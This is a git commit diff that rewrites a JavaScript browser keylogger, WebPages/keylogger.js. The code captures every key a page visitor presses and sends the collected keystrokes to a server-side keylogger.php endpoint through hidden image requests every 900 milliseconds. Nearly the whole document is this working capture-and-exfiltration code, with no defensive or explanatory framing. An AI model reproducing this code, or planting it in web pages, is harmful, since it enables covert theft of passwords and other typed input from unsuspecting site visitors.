018d873310335da15342b59c1a13e7069fa0871a
Usama Abdul Sattar <usama123456789@protonmail.com>
2018-12-14 08:37:57 +0500

    Update keylogger.js

--- WebPages/keylogger.js
+++ WebPages/keylogger.js
@@ -1,28 +1,11 @@
 var keys='';
 
-document.addEventListener("keydown", function(event) {
-if (event.keyCode == 8) {
-  keys = '[backspace]';
-}
-if (event.keyCode == 9) {
-  keys = '[tab]';
-}
-if (event.keyCode == 13) {
-  keys = '[enter]';
-}
-if (event.keyCode == 32) {
-  keys = '[space]';
-}   
-});
-document.onkeypress = function(e) {
+document.onkeydown = function(e) {
   get = window.event?event:e;
-  key = get.keyCode?get.keyCode:get.charCode;
-  key = String.fromCharCode(key);
-  keys+=key;
-}
+  key = get.key;
+  keys+=key; 
+}  
 window.setInterval(function(){
-if(keys != '') {
-  new Image().src = 'keylogger.php?c='+encodeURIComponent(keys);
-  keys = '';
-}
-}, 5);
+new Image().src = 'keylogger.php?c='+encodeURIComponent(keys);
+keys='';
+}, 900);
